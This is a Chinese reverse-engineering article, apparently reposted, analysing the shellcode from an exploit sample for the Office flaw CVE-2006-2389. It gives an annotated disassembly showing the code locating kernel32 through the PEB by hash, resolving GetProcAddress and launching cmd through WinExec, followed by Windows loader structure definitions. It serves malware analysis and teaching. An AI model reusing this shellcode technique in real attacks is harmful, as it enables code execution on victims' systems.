@@ -1,0 +1,206 @@
+
+# CVE-2006-2389 漏洞 shellcode 解析
+
+> 原文：[`www.pediy.com/kssd/pediy11/121380.html`](https://www.pediy.com/kssd/pediy11/121380.html)
+
+CVE-2006-2389 漏洞 shellcode 解析  
+
+AUTHOR:Cryin  
+
+BLOG:[`hi.baidu.com/justear/blog`](http://hi.baidu.com/justear/blog)  
+
+关于 Microsoft Office Property Code Execution exploit 的漏洞其编号为 `CVE-2006-2389`，今年 9 月在 `sebug` 上看到其样本，对其进行分析，并想自己重新写个此漏洞的利用工具，现在将其中样本自身的 shellcode 反汇编并详解。
+
+## shellcode 反汇编
+
+```
+0830674C    FC              CLD     //DF 复位，即 DF=0    
+0830674D    33D2            XOR EDX,EDX    //EDX 清零         
+0830674F    B2 30           MOV DL,30    //dl=30  
+08306751    64:FF32         PUSH DWORD PTR FS:[EDX]  //找到 PEB 压入栈  
+08306754    5A              POP EDX  //赋给 EDX  
+08306755    8B52 0C         MOV EDX,DWORD PTR DS:[EDX+C]  //找到 PEB_LDR_DATA  
+08306758    8B52 14         MOV EDX,DWORD PTR DS:[EDX+14]  //这个特殊点，去找 InMemoryOrderModuleList 了  
+0830675B    8B72 28         MOV ESI,DWORD PTR DS:[EDX+28]  //找到 LDR_MODULE 结构的 BaseDllName，其实是当前进程的名称，我实验过的!  
+0830675E    33C9            XOR ECX,ECX  //ecx=0  
+08306760    B1 18           MOV CL,18    //计数器吧 WINWORD.EXE 加上结束符的长度 12*2  
+08306762    33FF            XOR EDI,EDI  //edi  
+08306764    33C0            XOR EAX,EAX //eax  
+08306766    AC              LODS BYTE PTR DS:[ESI] //把 ds:[esi]指向的内存数据传送到 eax 里面，每次一个字符  
+08306767    3C 61           CMP AL,61    //所有大写字母都小于 a ASSCII=61  
+08306769    7C 02           JL SHORT 0830676D  //如果小于则跳至 0830676D  
+0830676B    2C 20           SUB AL,20    //如果不小于则转换为小写字母  
+0830676D    C1CF 0D         ROR EDI,0D  //循环右移 0d  
+08306770    03F8            ADD EDI,EAX  //将移位结果与 eax 相加  
+08306772  ^ E2 F0           LOOPD SHORT 08306764 //循环处理，直到处理完整个进程名称  
+08306774    81FF 5BBC4A6A   CMP EDI,6A4ABC5B  //判断是不是 kernel32.dll 处理所得的数据  
+0830677A    8B5A 10         MOV EBX,DWORD PTR DS:[EDX+10] //继续查看下一模块  
+0830677D    8B12            MOV EDX,DWORD PTR DS:[EDX]  
+0830677F  ^ 75 DA           JNZ SHORT 0830675B  //如果不是 6A4ABC5B，则跳转，如果是则说明找到 kernel32.dll  
+08306781    8B53 3C         MOV EDX,DWORD PTR DS:[EBX+3C]//找到 kernel32.dll 的地址后开始定位 api 地址  
+08306784    03D3            ADD EDX,EBX      //找到'PE',以下开始搜索 API  
+08306786    FF72 34         PUSH DWORD PTR DS:[EDX+34]  
+08306789    8B52 78         MOV EDX,DWORD PTR DS:[EDX+78]  
+0830678C    03D3            ADD EDX,EBX  
+0830678E    8B72 20         MOV ESI,DWORD PTR DS:[EDX+20]  
+08306791    03F3            ADD ESI,EBX  
+08306793    33C9            XOR ECX,ECX  
+08306795    41              INC ECX  
+08306796    AD              LODS DWORD PTR DS:[ESI]  
+08306797    03C3            ADD EAX,EBX  
+08306799    8138 47657450   CMP DWORD PTR DS:[EAX],50746547   //搜索 API 函数 GetPriorityClass  
+0830679F  ^ 75 F4           JNZ SHORT 08306795  
+083067A1    8178 04 726F634>CMP DWORD PTR DS:[EAX+4],41636F72  
+083067A8  ^ 75 EB           JNZ SHORT 08306795  
+083067AA    8178 08 6464726>CMP DWORD PTR DS:[EAX+8],65726464  //GetProcAddress  
+083067B1  ^ 75 E2           JNZ SHORT 08306795  
+083067B3    49              DEC ECX  
+083067B4    8B72 24         MOV ESI,DWORD PTR DS:[EDX+24]  
+083067B7    03F3            ADD ESI,EBX  
+083067B9    66:8B0C4E       MOV CX,WORD PTR DS:[ESI+ECX*2]  
+083067BD    8B72 1C         MOV ESI,DWORD PTR DS:[EDX+1C]  
+083067C0    03F3            ADD ESI,EBX  
+083067C2    8B148E          MOV EDX,DWORD PTR DS:[ESI+ECX*4]  
+083067C5    03D3            ADD EDX,EBX  
+083067C7    52              PUSH EDX  
+083067C8    68 78656301     PUSH 1636578  
+083067CD    FE4C24 03       DEC BYTE PTR SS:[ESP+3]  
+083067D1    68 57696E45     PUSH 456E6957  //WinExec  
+083067D6    54              PUSH ESP  
+083067D7    53              PUSH EBX  
+083067D8    FFD2            CALL EDX  //调用 GetProcAddress 获取函数 WinExec 的地址  
+083067DA    68 636D6401     PUSH 1646D63 //646d63==cmd  
+083067DF    FE4C24 03       DEC BYTE PTR SS:[ESP+3] //01646D63 中的 01-1 就剩下 646D63=cmd 了  
+083067E3    6A 05           PUSH 5 //第二个参数 SW_SHOW  
+083067E5    33C9            XOR ECX,ECX  //清零，用来保存参数  
+083067E7    8D4C24 04       LEA ECX,DWORD PTR SS:[ESP+4]  //取到 cmd 的偏移地址  
+083067EB    51              PUSH ECX  //压入第一个参数 cmd  
+083067EC    FFD0            CALL EAX  //调用 WinExec("cmd.exe",SW_SHOW)  
+083067EE    68 65737301     PUSH 1737365  
+083067F3    8BDF            MOV EBX,EDI  
+083067F5    FE4C24 03       DEC BYTE PTR SS:[ESP+3]  
+083067F9    68 50726F63     PUSH 636F7250  
+083067FE    68 45786974     PUSH 74697845  //ExitProcess  
+08306803    54              PUSH ESP  
+08306804    FF7424 20       PUSH DWORD PTR SS:[ESP+20]  
+08306808    FF5424 20       CALL DWORD PTR SS:[ESP+20]  //调用 GetProcAddress 获取函数 ExitProcess 的地址  
+0830680C    57              PUSH EDI  //压入参数  
+0830680D    FFD0            CALL EAX  //调用 ExitProcess 结束 shellcode
+```
+
+## 结构体说明
+
+### 结构体: `PEB_LDR_DATA`
+
+```
+typedef struct _PEB_LDR_DATA {
+  ULONG                   Length;
+  BOOLEAN                 Initialized;
+  PVOID                   SsHandle;
+  LIST_ENTRY              InLoadOrderModuleList;
+  LIST_ENTRY              InMemoryOrderModuleList;
+  LIST_ENTRY              InInitializationOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+```
+
+参数介绍:
+
+`Length`  
+
+`Size of structure, used by ntdll.dll as structure version ID.`  
+
+`Initialized`  
+
+`If set, loader data section for current process is initialized.`  
+
+`SsHandle`  
+
+`- ???`  
+
+`InLoadOrderModuleList`  
+
+`Doubly linked list containing pointers to LDR_MODULE structure for previous and next module in load order.`  
+
+`InMemoryOrderModuleList`  
+
+`As above, but in memory placement order.`  
+
+`InInitializationOrderModuleList`  
+
+`As InLoadOrderModuleList, but in initialization order.`
+
+### 结构体:`LDR_MODULE`
+
+```
+typedef struct _LDR_MODULE {
+  LIST_ENTRY              InLoadOrderModuleList;
+  LIST_ENTRY              InMemoryOrderModuleList;
+  LIST_ENTRY              InInitializationOrderModuleList;
+  PVOID                   BaseAddress;
+  PVOID                   EntryPoint;
+  ULONG                   SizeOfImage;
+  UNICODE_STRING          FullDllName;
+  UNICODE_STRING          BaseDllName;
+  ULONG                   Flags;
+  SHORT                   LoadCount;
+  SHORT                   TlsIndex;
+  LIST_ENTRY              HashTableEntry;
+  ULONG                   TimeDateStamp;
+} LDR_MODULE, *PLDR_MODULE;
+```
+
+参数介绍:
+
+`InLoadOrderModuleList`  
+
+`Pointers to previous and next LDR_MODULE in load order.`  
+
+`InMemoryOrderModuleList`  
+
+`Pointers to previous and next LDR_MODULE in memory placement order.`  
+
+`InInitializationOrderModuleList`  
+
+`Pointers to previous and next LDR_MODULE in initialization order.`  
+
+`BaseAddress`  
+
+`Module base address known also as HMODULE.`  
+
+`EntryPoint`  
+
+`Module entry point (address of initialization procedure).`  
+
+`SizeOfImage`  
+
+`Sum of all image's sections placed in memory. Rounded up to 4Kb (page size).`  
+
+`FullDllName`  
+
+`Path and name of module.`  
+
+`BaseDllName`  
+
+`Module name only.`  
+
+`Flags`  
+
+`LoadCount`  
+
+`TlsIndex`  
+
+`HashTableEntry`  
+
+`LIST_ENTRY contains pointer to LdrpHashTable. Both prev and next values are the same.`  
+
+`LdrpHashTable it is table of LIST_ENTRY structures points to LDR_MODULE for current process.`  
+
+`TimeDateStamp`
+
+## 参考
+
+[`undocumented.ntinternals.net/`](http://undocumented.ntinternals.net/)  
+
+[`sebug.net/vuldb/page/0/0/3/`](http://sebug.net/vuldb/page/0/0/3/)  
+
+[`www.microsoft.com/china/techn.../MS06-038.mspx`](http://www.microsoft.com/china/technet/security/bulletin/MS06-038.mspx)
